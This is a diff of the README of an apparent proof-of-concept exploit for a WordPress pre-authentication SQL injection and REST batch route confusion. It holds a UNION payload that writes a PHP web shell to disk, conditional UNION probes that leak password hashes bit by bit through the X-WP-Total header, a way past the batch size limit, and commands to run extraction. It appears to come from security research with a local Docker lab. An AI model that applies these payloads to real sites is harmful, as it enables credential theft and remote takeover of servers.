@@ -101,7 +101,7 @@ author_exclude = 0) AND 1=0 UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUT
 
 ## Fast extraction via X-WP-Total bitmask oracle
 
-Existing PoCs use blind boolean extraction — 1 bit per HTTP request, ~224 requests for a password hash. This repo introduces two techniques that combine for ~75x faster extraction.
+Existing PoCs use blind boolean extraction — 1 bit per HTTP request, ~224 requests for a password hash. This repo combines two techniques for ~75x faster extraction.
 
 **X-WP-Total oracle.** WordPress adds `SQL_CALC_FOUND_ROWS` to post queries and puts the count in the `X-WP-Total` response header. UNION rows are counted at the SQL level even though PHP filters them from the response body. Conditional UNIONs encode individual bits:
 
@@ -115,9 +115,9 @@ UNION SELECT 1 WHERE (ASCII(SUBSTRING((...),1,1)) & 2) > 0   -- bit 1
 
 `X-WP-Total` = 0 (bit not set) or 1 (bit set). Seven probes = one full ASCII character.
 
-**Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this — the inner batch runs through `serve_batch_request_v1()` recursively with no size check. All 7 bit-probes for multiple characters pack into one inner batch.
+**Unlimited inner batch.** The outer batch validates `maxItems: 25` via its schema. The route confusion bypasses this — the inner batch runs recursively with no size check. All 7 bit-probes for multiple characters pack into one request.
 
-16 characters × 7 bits = 112 probes per HTTP request. A 34-char phpass hash in ~3 requests instead of ~224.
+16 chars × 7 bits = 112 probes per request. A 34-char phpass hash in ~3 requests instead of ~224.
 
 ## Quick start
 
@@ -152,29 +152,15 @@ python3 -m exploit extract http://localhost:8888 --proxy http://127.0.0.1:8080
 cd docker && ./setup.sh down
 ```
 
-## Modules
-
-```
-exploit/
-├── batch.py      payload construction + HTTP client
-├── detect.py     marker probe (safe) + timing confirmation
-├── blind.py      boolean oracle, binary search, 1 bit/request
-├── fast.py       X-WP-Total bitmask oracle, batch-parallel, ~16 chars/request
-├── rce.py        INTO OUTFILE webshell (needs FILE privilege)
-└── __main__.py   CLI: check, extract, rce, debug-fast
-
-docker/
-├── compose.yaml  WordPress 6.9.4 + MySQL 8.0
-├── init.sql      grants FILE privilege for RCE testing
-└── setup.sh      one-command lab setup
-```
-
 ## References
 
 - [WordPress 7.0.2 release](https://wordpress.org/news/2026/07/wordpress-7-0-2-release/)
 - [Searchlight Cyber advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core)
 - [GHSA-ff9f-jf42-662q](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ff9f-jf42-662q) (route confusion)
 - [GHSA-fpp7-x2x2-2mjf](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-fpp7-x2x2-2mjf) (SQLi)
+- [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) — blind SQLi + post-auth webshell
+- [AdnaneKhan/Wp2Shell-RCE](https://github.com/AdnaneKhan/Wp2Shell-RCE) — INTO OUTFILE RCE with Docker lab
+- [sergiointel/wp2shell-poc](https://github.com/sergiointel/wp2shell-poc) — minimal timing-based PoC
 
 ## Legal
 
